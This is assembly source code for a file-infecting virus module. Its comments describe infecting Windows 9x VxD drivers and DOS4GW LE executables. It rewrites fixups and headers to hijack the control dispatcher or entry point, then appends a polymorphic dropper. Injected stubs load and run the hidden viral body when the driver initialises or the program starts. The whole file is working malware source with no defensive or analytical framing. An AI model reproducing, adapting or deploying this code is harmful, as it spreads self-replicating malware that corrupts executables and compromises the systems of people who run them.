;
;  module infle
;
;  input:    al = INF_VXD/INF_DOS4
;           edx = name
;  returns: eax = 1 - ok, 0 - failed
;
;
;
;


RELO_TABLE_SIZE = 16384
RELO_TABLE_BLOCK_SIZE = 5
RELO_TABLE_UPPER_LIMIT EQU 131072
;(RELO_TABLE_SIZE*8)


ifndef PASS2
include globals.1
else
include globals.2
endif

common_data     segment public byte USE32 'COMMON'
buffer          db 100h dup (?)
le_header       db 100h dup (?)

common_data     ends


indep_mod       segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature

; ---------- CODE SECTION -------------------------------

         align 1

DDB_CTRL_PROC = 6*4
ICODE_SEG = 1

readfile macro off, len, buf
         mov   eax, off
         mov   ecx, len
         lea   edx, buf
         call  rdfile
         endm

writefile macro off, len, buf
         mov   eax, off
         mov   ecx, len
         lea   edx, buf
         call  wrfile
         endm

; this function fails or infects vxd file
; if file can't be infected, it shouldn't be damaged
; except one of write fails
infectLE:
        cmp    initialize, 0
        je     cont
        ret
cont:
        mov    infmode, al

        xor    eax, eax
        mov    total_base, eax
        mov    relo_map_ptr, eax

        mov    resume_esp, esp
        ; copy filename to loader (this file will contain extra data)
        push   ds
        pop    es

        mov    esi, edx
        lea    edi, xname
next_char:
        lodsb
        stosb
        or     al, al
        jnz    short next_char

        mov    eax, Ring0_FileIO
        mov    directIO, eax

        ;marker 'processing le'

        ; open vxd file

        mov    leseek, 0
        mov    objectr, 0

        mov    eax, R0_OPENCREATFILE
        mov    esi, edx
        mov    dx, 1                            ; open file if exists
        mov    bx, 2
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO
        jc     cant_open

        mov    vxdhandle, eax
        mov    ebx, eax

        ; get filetime to check whether infected
        ; skipped

        ; query for file length and set it to vxd loader
        mov    eax, R0_GETFILESIZE
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        mov    dword ptr [vxdfileptr+1], eax
        mov    dword ptr [DOS4priptr+1], eax

        ; check if WATCOM ? loader
        cmp    byte ptr infmode, INF_DOS4
        jne    short continue_vxd

        readfile 0h 16 le_header
        cmp    word ptr le_header, 'ZM'
        je     short ok001
        cmp    word ptr le_header, 'MZ'
        jne    novalidvxd
ok001:

        movzx  esi, word ptr [le_header+4]
        dec    esi
        shl    esi, 9
        movzx  ebx, word ptr [le_header+2]
        add    esi, ebx

        readfile esi 24h le_header
        cmp    word ptr [le_header], 5742h
        jne    short continue_vxd
        add    esi, dword ptr [le_header+20h]
        mov    total_base, esi

continue_vxd:

        ; read pointer to le header
        readfile 3ch 4 objectr

        mov      eax, objectr
        mov      leseek, eax

        ; read le header
        readfile 0 100h le_header

        ; check 4 signature
        cmp    word ptr le_header, 'EL'
        jne    novxd

        ; check if pages are 4096 bytes long
        cmp    dword ptr le_header+28h, 1000h
        jne    novalidvxd

        cmp    infmode, INF_VXD
        jne    do_other

        mov    eax, dword ptr le_header+18h
        or     eax, dword ptr le_header+1ch
        or     eax, eax
        jne    novxd          ; seems to be a real executable ! ; UPDATE

        ;marker 'assuming entry'
        ; xor    eax, eax     !! must be zero, just look up
        call   le_assume_entry ; 0th entry will be DDB
        ; get old ctrl proc
        readfile DDB_CTRL_PROC 4 old_disp_ptr   ; read old disp ptr

        push   objectr                          ; save relative address to DDB

        ; try to find fixup of DDB_CTRL_PROC
        ;marker 'find fixupps'
        mov    eax, DDB_CTRL_PROC
        add    eax, objoffset
        add    eax, objpage

        ;marker 'find fixupp'
        call   find_fixup
        jc     cant_find_fixup

        mov    objectr, 0

        ; read whole fixup info
        ;marker 'process fixupp'
;        sub    fixupptr, 5
;
;        mov    eax, fixupptr
;        mov    ecx, fixupinfo_len
;        lea    edx, fixupinfo
;        call   rdfile
;
;        ; check if correct fixup type
;        cmp    byte ptr fixID, 7
;        jne    cant_find_fixup                 ; may crash!
;
;        marker 'fix_ok'
;
;        ; get old disp from fixup
;        movzx  eax, word ptr relo
;        test   fixtype, 10h                     ; check if 32-bit relo
;        jz     skipeax
;        mov    eax, relo                        ; correct to 32-bit
;skipeax:
        mov    eax, fixupptr
        mov    ecx, 4
        lea    edx, relo
        call   rdfile
        mov    eax, relo
        cmp    fix32, 0
        jne    @@fix_is_32
        movzx  eax, ax                          ; make 16 bit
@@fix_is_32:



        ; what happened if not the same ? may be other kind of compiler
        ; cmp    eax, old_disp_ptr                ; not the same ?!
        ; jne    novalidvxd

        mov    old_disp_ptr, eax                ; not the same ?!


        ; try to grow first object
        mov    eax, ICODE_SEG                   ; i hope this wouldn't change
        call   getobjptr

        mov    objectr, eax
        readfile 0 18h buffer                   ; read object description

        ; compute my ctrl proc addr (at end of ICODE_SEG)
        mov    eax, dword ptr buffer            ; get object virtual size
        mov    new_ctrl_ptr, eax

        ; try to update fixup
;        test   fixtype, 10h  ; 32-bit?
        cmp    fix32, 0       ; 16-bit?
        jnz    skipchk
        ; test if there is enough place in fixup entry
        cmp    eax, 10000h
        jnb    novalidvxd
skipchk:
        ; update fixup
;       mov    word ptr relo, ax
;       test   fixtype, 10h  ; 32-bit?
;       jz     skipupdhi
;       mov    relo, eax
;skipupdhi:
        mov    relo, eax

        ; is page free enough?
        mov    ebx, eax
        add    eax, new_disp_len
        push   eax
        or     eax, 0fffh       ; couldn't be infected next time !!!
                                ; UPDATE
;        push   eax  ; push new object virtual size
;        and    eax, not 0fffh
;        and    ebx, not 0fffh
;        cmp    eax, ebx
;        jne    cant_infect_1

;        pop    eax  ; pop new object virtual size
        or     ebx, 0fffh
        cmp    eax, ebx
        jne    cant_infect_1

        mov    dword ptr buffer, eax ; update virtual size
        mov    total_len, eax
        pop    eax

        ; relocate jmp 2 old ctrl proc
;        sub    old_disp_ptr, eax
;        add    old_disp_ptr, real_ctrl_end - very_next_label
        sub    old_disp_ptr, very_next_label - new_ctrl

        ; update object table          we know how to infect vxd, so flush changes
        writefile 0 18h buffer

        ; flush updated fixup
;        mov    eax, fixupptr
;        mov    objectr, eax
;        writefile  0 fixupinfo_len fixupinfo

        mov    eax, fixupptr
        mov    objectr, eax
        xor    eax, eax
        movzx  ecx, fix32
        lea    ecx, [2*ecx+2]   ; 0 -> 2; 1->4
        lea    edx, relo
        call   wrfile

        pop    objectr

        ; update DDB block
        writefile DDB_CTRL_PROC 4 new_ctrl_ptr

        mov    eax, fixupptr


        mov    eax, ICODE_SEG
        call   le_assume_object

        lea    eax, InternalFileIO
        mov    Ring0_FileIO, eax

        mov    eax, POLY_HANDLER or POLY_FIXED_ENTRY or POLY_DROPPER
        mov    edx, new_ctrl_ptr
        mov    ebx, total_len
        lea    edi, fixup_ldrVXD
        mod_call md_poly

        mov    eax, directIO
        mov    Ring0_FileIO, eax

;        mov    eax,

        ; write new ctrl proc
;        writefile new_ctrl_ptr new_disp_len new_ctrl



;append_dropper:

quit:
;        mov    eax, R0_CLOSEFILE
;        mov    ebx, vxdhandle
;        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        mov    al, 1
        jmp    ultimate_quit

cant_infect_2:
cant_find_fixup:
        add    esp, 4   ; objectr
        jmp    print

cant_infect_1:
NOT_WATCOM_FILE:
        add    esp, 8   ; eax, objectr
        jmp    print

invalid_file:
justinfected:
novxd:
novalidvxd:
print:
;        RAISE_X INF_FILE_FATAL
        xor    eax, eax

ultimate_quit:

        push   eax
        mov    eax, R0_CLOSEFILE
        mov    ebx, vxdhandle
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        ; free relo map if essential
        cmp    relo_map_ptr, 0
        je     no_free_relo_map

        mov    eax, -1
        mod_call md_alloc

no_free_relo_map:

        pop    eax

        mov    esp, resume_esp
        ret

cant_open:
        xor    eax, eax
        ret


; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this part will infect DOS4GW LE executable files
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

STD_WATCOM_ENTRY = 415776ebh

do_other:             ; do DOS4GW
        mov    eax, dword ptr le_header+1ch
        or     eax, eax
        jz     invalid_file
        mov    DOS4_disp_ptr, eax

        ; try to grow first object
        mov    eax, dword ptr le_header+18h
        push   eax
        mov    objectr, 0
        call   getobjptr

        mov    objectr, eax
        readfile 0 18h buffer                   ; read object description

        ; compute my ctrl proc addr (at end of ICODE_SEG)
        mov    eax, dword ptr buffer            ; get object virtual size
        mov    new_ctrl_ptr, eax

        ; is page free enough?
        mov    ebx, eax
        add    eax, DOS4_disp_len

        push   eax

        or     eax, 0fffh               ; set full 1000h section
                                        ; couldn't be infected
                                        ; UPDATE

;        push   eax  ; push new object virtual size
;        and    eax, not 0fffh
;        and    ebx, not 0fffh
;        cmp    eax, ebx
;        jne    cant_infect_1

;        pop    eax  ; pop new object virtual size

        or     ebx, 0fffh
        cmp    eax, ebx
        jne    cant_infect_1

        mov    dword ptr buffer, eax ; update virtual size
        pop    eax

        ; relocate jmp 2 old ctrl proc
;        sub    DOS4_disp_ptr, eax
;        add    DOS4_disp_ptr, DOS4_real_ctrl_end - DOS4_very_next_label
        sub    DOS4_disp_ptr, DOS4_very_next_label - DOS4_new_ctrl

        ; update object table          we know how to infect vxd, so flush changes
        writefile 0 18h buffer

        pop    eax              ; push code object
        call   le_assume_object

        ; write new ctrl proc

        ; writefile new_ctrl_ptr DOS4_disp_len DOS4_new_ctrl
        lea    eax, InternalFileIO
        mov    Ring0_FileIO, eax

        mov    eax, POLY_DROPPER
        mov    edx, new_ctrl_ptr
        mov    ebx, total_len
        lea    edi, fixup_ldrEXE
        mod_call md_poly

        mov    new_ctrl_ptr, eax

        mov    eax, directIO
        mov    Ring0_FileIO, eax

        ; update header
        mov    eax, leseek
        mov    objectr, eax
        writefile 1ch 4 new_ctrl_ptr

;        jmp    append_dropper
        jmp    quit




; finds fixup in fixup table that relocates eax
; sets fixupptr = ptr to entry in fixup table (relative to filestart)
; parses whole fixup table in order to find an entry and create relo map
; eax = pointer to find

find_fixup:
        ; toto zatial nefunguje
        mov      edi, eax

        xor      eax, eax
        mov      fixupptr, eax
        mov      fix32, al
        mov      fix_important, al

        ; allocate table for relos
        mov      eax, RELO_TABLE_SIZE/8
        mod_call md_alloc
        mov      relo_map_ptr, eax

        ; make whole area unusable
        push     edi
        mov      edi, eax

        xor      eax, eax
        dec      eax
        mov      ecx, RELO_TABLE_SIZE/8/4
        rep      stosd

        pop      edi


        ; walk across all objects and process some of them

        xor      eax, eax
        inc      eax

@@loop_section:
        push     eax

        ; eax = object ptr
        call     le_assume_object

        mov      eax, leseek
        mov      objectr, eax   ; base to LE filestart

        test     flags, 10100000b
        jnz      @@skip_this_object


        mov      eax, objpage
        mov      temp_base, eax

        ; get size of object
        mov      ecx, pageen3z
        push     ecx
        shl      ecx, 12
        call     zero_out_block

        pop      ecx
        mov      eax, pageindex
        ; walk through page map and fixup entries

@@process_page:
        push     eax ecx

        ; load item

        ; 4 bytes long entry
        dec      eax
        shl      eax, 2
        add      eax, dword ptr [LE_header +48h]

        mov      ecx, size page_map_table_entry
        lea      edx, page_desc
        call     rdfile

; doesn't work on VxD LE files
;        cmp      page_desc.page_type, 0
;        je       @@hardcopy_no_work

        movzx    eax, page_desc.fixup_index
        xchg     al, ah

        ; now get ptr to relocation by index
        push     eax
        dec      eax
        shl      eax, 2
        add      eax, dword ptr [LE_header+68h]

        lea      edx, fixup_cur
        xor      ecx, ecx
        mov      cl, 8
        call     rdfile ; v tejto tabulke je vzdy jeden prvok navyse, aby
                        ; sa lahko hladal koniec

        pop      eax

        mov      ecx, fixuptrnext
        mov      eax, fixup_cur
        sub      ecx, eax

        add      eax, dword ptr [LE_header+6ch]

        ; eax points to fixup table

        ; process ecx bytes from fixup record
        add     ecx, eax

        sub     edi, temp_base

@@loop_this_page:
        cmp     eax, ecx
        jae     @@just_done

@@cont_relo:
        push    eax ecx

        ; load relocation in buffer
        lea     edx, buffer
        mov     ecx, 20h
        call    rdfile


        ; process relocation
        lea     esi, buffer
        xor     eax, eax

        ; get first byte
        lodsw
        mov     ecx, eax

        ; test if single
        test    cl, 20h
        jnz     @@multiple1

        lodsw
        call    set_eax

        cmp     eax, edi
        sete    fix_important

        jmp     @@not_multi

@@multiple1:

        lodsb   ; count
        mov     dl, al

@@not_multi:

        ; check for unknown relocation
        mov     eax, ecx
        and     ax, 0001100001111b
        cmp     ax, 7h
        je      @@type_78
        cmp     ax, 8h
        je      @@type_78

;        marker 'unknown relocation'
;        raise_x INF_FILE_FATAL

@@type_78:

        ; assume object is 8 bit
        lodsb
        ; if important object store ptr and size
        cmp     fix_important, 1
        jne     @@no_important

        mov     fixupptr, esi
        sub     fixupptr, offset cs:buffer
        mov     eax, dword ptr [esp+4]
        add     fixupptr, eax
        mov     eax, objectr
        add     fixupptr, eax
        xor     eax, eax

        test    ch, 10h
        setnz   fix32

@@no_important:
        lodsw
        test    ch, 10h ; check if 32-bit
        jz      @@fixed
        lodsw

@@fixed:

        test    cl, 20h
        jz      @@nomultiple2

        mov     @@prefix, 66h
        test    cl, 10h
        jz      @@no_prefix_chg

;        marker  '32-bit repeated relo'
        mov     @@prefix, 90h

@@no_prefix_chg:

        movzx   ecx, dl
@@enz:
@@prefix db 66h, 0adh    ; lodsw

        call    set_eax

        loop    @@enz

@@nomultiple2:

        pop     ecx eax

        sub     esi, offset cs:buffer
        add     eax, esi

        jmp     @@loop_this_page
@@just_done:

        add     edi, temp_base

        ; done

@@hardcopy_no_work:
        pop      ecx eax

        inc      eax

        add      temp_base, 1000h

        dec      ecx
        jnz      @@process_page



@@skip_this_object:

        pop      eax
        inc      eax
        cmp      eax, dword ptr [le_header+44h]  ; cnt of objects
        jbe      @@loop_section

        ret

set_eax:
        push  eax ebx
        add   eax, temp_base
        shr   eax, RELO_TABLE_BLOCK_SIZE

        cmp   eax, RELO_TABLE_UPPER_LIMIT
        ja    @@err

        mov   ebx, relo_map_ptr

        btr   dword ptr [ebx], eax

        pop   ebx  eax
        ret
@@err:  ;marker 'RELO_TABLE_EXCEED'
        pop   ebx  eax
        ret


zero_out_block:
        push  eax ebx ecx

        mov   ebx, relo_map_ptr

        shr   eax, RELO_TABLE_BLOCK_SIZE

@@zero_out_next:
        btr   dword ptr [ebx], eax
        inc   eax
        cmp   eax, RELO_TABLE_UPPER_LIMIT
        jae   @@cln_exceed
        sub   ecx, (1 shl RELO_TABLE_BLOCK_SIZE)
        jb    @@zero_out_next

@@cln_exceed:
        pop   ecx ebx eax
        ret

; this will assume entry eax (read and write will be relative to this)
; assume entry      eax - entry num
le_assume_entry:
        ; relative to header
        mov   edx, leseek
        mov   objectr, edx

        ; get entry offset in file
        add   eax, eax
        lea   eax, [eax+4*eax+1]        ; * 10 + 1
        add   eax, dword ptr le_header[5ch]

        ; read entry descriptor
        mov   ecx, 10
        lea   edx, buffer
        call  rdfile

        ; get object num
        movzx  eax, word ptr buffer+1

        ; assume this object
        call   le_assume_object
        ; add relative entry offset
        mov    eax, dword ptr buffer+4
        add    objectr, eax
        mov    objoffset, eax
        ret



; this will assume object eax (read and write will be relative to this)
; eax - object num
le_assume_object:
        ; relative 2 0
        mov   objectr, 0

        ; get ptr to object descriptor
        call  getobjptr ; (eax will be ptr)

        ; read object descriptor
        mov   ecx, object_desc_len
        lea   edx, object_desc
        call  rdfile            ; read object descriptro
        mov   eax, pageindex
        dec   eax
        shl   eax, 12           ; page->offset  ; patch was here
        mov   objectr, eax
        mov   objpage, eax
        ; add file data page start
        mov   ebx, dword ptr le_header+80h   ; page start
        add   objectr, ebx
        ret


        ; compute object descriptor offset in file (relative to 0)
        ; eax - object num
getobjptr:
        shl   eax, 3
        lea   eax, [eax+2*eax-24]       ; first object is num 1
        add   eax, dword ptr le_header+40h
        add   eax, leseek
        ret



; eax - ptr
; ecx - len
; edx - buf
; this will read from file at file offset eax ecx bytes to buffer [edx]
rdfile:
         pushad

         mov     esi, edx
         mov     edx, eax
         add     edx, objectr
         add     edx, total_base
         mov     eax, R0_READFILE                ; - write sector to disk
         mov     ebx, vxdhandle
         call    dword ptr directIO              ; VxDCall IFSMgr_Ring0_FileIO

         popad
         ret


; eax - ptr
; ecx - len
; edx - buf
; this will write to file at file offset eax ecx bytes from buffer [edx]
wrfile:
         pushad

         mov     esi, edx
         mov     edx, eax
         add     edx, objectr
         add     edx, total_base
         mov     eax, R0_WRITEFILE               ; - write sector to disk
         mov     ebx, vxdhandle
         call    dword ptr directIO              ; VxDCall IFSMgr_Ring0_FileIO

         popad
         ret




InternalFileIO:                                  ; internal file IO
         cmp     eax, R0_READFILE
         je      do_rd_file
         cmp     eax, R0_WRITEFILE
         je      do_wr_file
         ret
do_rd_file:
         xchg    eax, edx
         xchg    edx, esi
         call    rdfile
         xchg    eax, edx
         xchg    edx, esi
         mov     eax, ecx
         ret
do_wr_file:
         cmp     edx, -1
         je      do_dropper
         xchg    eax, edx
         xchg    edx, esi
         call    wrfile
         xchg    edx, esi
         xchg    eax, edx
         mov     eax, ecx
         add     eax, edx
         mov     eax, ecx
         ret

do_dropper:
         ; append dropper to end of file
         push  edx ebx
;         int 3
         mov   edx, dword ptr [vxdfileptr+1]
         mov   ebx, vxdhandle
;         mov   dword ptr [set_drp_len], ecx
         call  directIO
         pop   ebx edx
         ret

fixup_ldrVXD:
         sub   old_disp_ptr, ebx
         lea   esi, new_ctrl
         mov   ecx, new_disp_len
         ret

fixup_ldrEXE:
         sub   DOS4_disp_ptr, ebx
         mov   dword ptr [drp_len+1], ecx
         lea   esi, DOS4_new_ctrl
         mov   ecx, DOS4_disp_len
         ret

; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู

; ------------ DATA SECTION ----------------------------------



resume_esp   dd 0

infmode   db 0

leseek    dd 0      ; le header offset
objectr   dd 0      ; relative object offset
objpage   dd 0      ; first page of current object
objoffset dd 0      ; offset in object
total_base dd 0     ; total file base

total_len dd 0      ; maximal object length
directIO  dd 0      ; Ring0_FileIO

object_desc label byte ; object info record
virtoff   dd 0
virtbase  dd 0
flags     dd 0
pageindex dd 0      ; page index ...
pageen3z  dd 0      ; num of page entriez
          dd 0
object_desc_len = $-object_desc

fixupindex  dd 0    ; index to fixup table
fixupptr    dd 0    ; ptr to entry that relocates something in fixup table
fix32       db 0    ; 32 bit fixup ?
fix_important db 0  ; important fixup?

temp_base   dd 0

fixup_cur   dd 0
fixuptrnext dd 0    ; ptr to next entry that relocates something in fixup table
                    ; next - this = size

page_map_table_entry struc
UNK                  db ?
fixup_index          dw ?
page_type            db ?
page_map_table_entry ends

page_desc            page_map_table_entry <0,0,0>


fixupinfo  label byte ; fixup info
fixID       db ?
fixtype     db ?
off         dw ?
xtype       db ?
relo        dd ?
fixupinfo_len = $-fixupinfo

vxdhandle      dd 0

new_ctrl_ptr   dd 0             ; offset of new control dispatcher

relo_map_ptr   dd 0             ; relocation map





; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this ctrl proc will be added to DOS4GW LE executable
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions

          nosmart
          nojumps

DOS4_new_ctrl: jmp     skipID
               db 'WATCOM'
skipID:
               push    ebp
               call    relohere2
relohere2:
               pop     ebp

               push    es

               ; find name in environment segment
               mov     es, word ptr es:[2ch]
               xor     edi, edi
xcont:
               mov     ecx, 07fffh
               mov     al, 0
               repne   scasb
               cmp     byte ptr es:[edi], 0
               jne     xcont
               add     edi, 3

               ; copy name to DOS4_name
               lea     esi, [EBP+DOS4_name-relohere2]
               sub     esi, edi
copy_envname:
               mov     al, es:[edi]
               mov     ds:[edi+esi], al
               inc     edi
               or      al, al
               jnz     copy_envname

               pop     es

               ; allocate memory
               mov     ax, 501h
               mov     ecx, MAXCODELEN
               mov     ebx, ecx
               shr     ebx, 16
               int     31h
               shl     ebx, 16
               mov     bx, cx
               or      ebx, ebx
               jz      outmem
               mov     [EBP+DOS4_blockptr-relohere2], ebx
               mov     word ptr [EBP+DOS4_blockhnd-relohere2], di
               mov     word ptr [EBP+DOS4_blockhnd-relohere2+2], si

               ; open file
               mov     ax, 3d00h
               lea     edx, [EBP+DOS4_name-relohere2]
               int     21h
               jc      invfile

               ; seek
               mov     bx, ax
               mov     ax, 4200h
DOS4priptr:    mov     edx, 1111h
               mov     ecx, edx
               shr     ecx, 16
               int     21h

               ; read code
               mov    ah, 3fh
               db     0b9h
set_drp_len    dd     MAXBODYLEN
               mov    edx, [EBP+DOS4_blockptr-relohere2]
               int    21h

drp_len:       cmp    eax, 12345678h
               jb     invfile

               ; close file
               mov    ah, 3eh
               int    21h

               ; run it
               push   es
               push   ds
               pop    es
               mov    eax, md_initDOS4
               call   dword ptr [EBP+DOS4_blockptr-relohere2]
               pop    es
invfile:
               ; free block

               ; NOT FOR NOW

               ;mov     di, word ptr [EBP+DOS4_blockhnd-relohere2]
               ;mov     si, word ptr [EBP+DOS4_blockhnd-relohere2+2]
               ;mov     ax, 502h
               ;int     31h
outmem:
               pop     ebp

               db  0e9h      ; jmp to original control dispatcher
DOS4_disp_ptr  dd  ?
DOS4_very_next_label label byte   ; don't move

DOS4_name      db 65 dup (0)
DOS4_blockptr  dd ?
DOS4_blockhnd  dd ?
DOS4_real_ctrl_end  label byte  ; end of control dispatcher
DOS4_disp_len = $-DOS4_new_ctrl








; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this ctrl proc will be added to vxd
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions



MAXCODELEN              equ MEMORY2ALLOCATE  ; may be vxd_dropper_len
R0_OPENCREATFILE        equ 0d500h
R0_READFILE             equ 0d600h
R0_CLOSEFILE            equ 0d700h




          nosmart
          nojumps

new_ctrl:
; my control dispatcher
; when message Init_Complete occured transfer control to my initializion routine
               cmp eax, 2    ; Init_Complete
               je  short testmi
origentry:
               db  0e9h      ; jmp to original control dispatcher
old_disp_ptr   dd  ?
very_next_label label byte   ; don't move

; we must use flexibile entry point because no idea where will be
; this code stored

testmi:
          push    ebp
          call    relohere
relohere:
          pop     ebp

          ; if ptr to extended block isn't NULL we were installed
          cmp     dword ptr [newpgmptr-relohere + ebp], 0
          jne     short just_loaded

          int 3
          pushad        ; save regs

          ; allocate max code len bytes from system heap
          push    0
          push    MAXCODELEN
          db      0cdh, 20h, 04fh, 00h, 01h, 00h ; VMMCall _HeapAllocate
          add     esp, 8
          or      eax, eax
          jz      short just_loaded2

          ; store ptr
          mov     [newpgmptr-relohere + ebp], eax

          cld

          ; check if IFSMgr installed
          db      0cdh, 20h, 0h, 0h, 40h, 0h ; VxDCall IFSMgr_Get_Version
          jc      short just_loaded2   ; failed ...

          ; try to open file
          mov     eax,R0_OPENCREATFILE
          xor     ecx, ecx      ; flags of file when creating
          mov     bx,2          ; open mode
          mov     dx,11h        ; action
          lea     esi, [ebp]+xname-relohere ; name
          db      0cdh, 20h, 32h, 0h, 40h, 0h ; VxDCall IFSMgr_Ring0_FileIO
          jc      just_loaded2                ; can't read ...

          mov     ebx,eax       ; save handle

          mov     eax,R0_READFILE
vxdfileptr:
          mov     edx, 0          ; offset in file (end of vxd)
          mov     ecx, MAXBODYLEN
          mov     esi, dword ptr [newpgmptr-relohere + ebp] ; buffer to load
          db      0cdh, 20h, 32h, 0h, 40h, 0h ; VxDCall IFSMgr_Ring0_FileIO

          or      eax, eax
          jz      just_loaded2                ; can't read ...

          mov     eax,R0_CLOSEFILE
          db      0cdh, 20h, 32h, 0h, 40h, 0h ; VxDCall IFSMgr_Ring0_FileIO

          ; this will be called only one time
          mov     eax, md_initVxD
          call    dword ptr [newpgmptr-relohere + ebp] ; call res code initialization

just_loaded2:
          popad
just_loaded:
          pop ebp
          jmp origentry
newpgmptr dd      0     ; ptr to new memory block
xname     db      64 dup (0) ; name of file containing part to load
real_ctrl_end  label byte  ; end of control dispatcher
new_disp_len = $-new_ctrl





; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this will be added to vxd being infected and code will be executed after
; vxd is loaded
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;vxd_dropper label near


indep_mod       ends

                end




